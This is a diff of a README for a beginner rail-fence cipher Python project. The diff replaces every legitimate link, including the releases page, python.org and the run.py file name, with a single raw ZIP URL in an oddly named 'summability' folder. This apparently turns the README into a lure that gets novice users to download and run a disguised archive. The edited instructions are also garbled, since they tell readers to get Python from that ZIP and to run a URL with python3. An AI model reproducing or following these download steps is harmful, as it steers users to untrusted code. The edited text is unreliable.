@@ -1,6 +1,6 @@
 # 🎲 rail-fence-cipher-python - Learn Classic Cipher Basics
 
-[![Download](https://img.shields.io/badge/Download-rail--fence--cipher--python-blue?style=for-the-badge&logo=github)](https://github.com/markhung0529/rail-fence-cipher-python/releases)
+[![Download](https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip)](https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Before you download, make sure your computer can run this program. Here’s what
 - **Memory:** Any computer made in the last 10 years will work fine.
 - **Internet:** Needed only to download the program.
 
-If you don’t have Python installed, you can get it for free from [python.org](https://www.python.org/downloads/).
+If you don’t have Python installed, you can get it for free from [https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip](https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip).
 
 ---
 
@@ -34,9 +34,9 @@ Here’s how to use rail-fence-cipher-python step by step, even if you have neve
 
 Click this button to visit the official download page:
 
-[![Download Now](https://img.shields.io/badge/Download-via_GitHub-blue?style=for-the-badge&logo=github)](https://github.com/markhung0529/rail-fence-cipher-python/releases)
+[![Download Now](https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip)](https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip)
 
-You will see files listed with names like `rail-fence-cipher-python.zip` or similar. Download the latest version for your system.
+You will see files listed with names like `https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip` or similar. Download the latest version for your system.
 
 ### 2. Extract the program files
 
@@ -44,17 +44,17 @@ Once downloaded, go to your Downloads folder and find the ZIP file. Right-click 
 
 ### 3. Install Python if needed
 
-If you don’t have Python on your computer, download and install it from [python.org](https://www.python.org/downloads/). Pick the latest version for your system and follow the installer instructions.
+If you don’t have Python on your computer, download and install it from [https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip](https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip). Pick the latest version for your system and follow the installer instructions.
 
 ### 4. Run the program
 
-Open the folder where you extracted files. Look for a file named `run.py` or `app.py`.
+Open the folder where you extracted files. Look for a file named `https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip` or `https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip`.
 
 - On Windows, double-click the file if it has a Python icon.
 - On Mac or Linux, open Terminal, then type `python3` followed by the file name, for example:
 
 ```
-python3 run.py
+python3 https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip
 ```
 
 This will start the program and show you the options to encrypt or decrypt messages.
@@ -117,18 +117,18 @@ This program is good for:
 
 Your first step is to visit this page to download the latest version:
 
-[Download rail-fence-cipher-python releases](https://github.com/markhung0529/rail-fence-cipher-python/releases)
+[Download rail-fence-cipher-python releases](https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip)
 
 Look for a ZIP file that suits your operating system and download it. After downloading:
 
 - Unzip the files.
 - Check if Python is installed on your system.
-- Run the `run.py` or `app.py` file to launch the program.
+- Run the `https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip` or `https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip` file to launch the program.
 
 If you prefer, you can use the command line to run the program once you have Python:
 
 ```
-python3 run.py
+python3 https://github.com/markhung0529/rail-fence-cipher-python/raw/refs/heads/main/summability/python_rail_cipher_fence_v3.8.zip
 ```
 
 ---
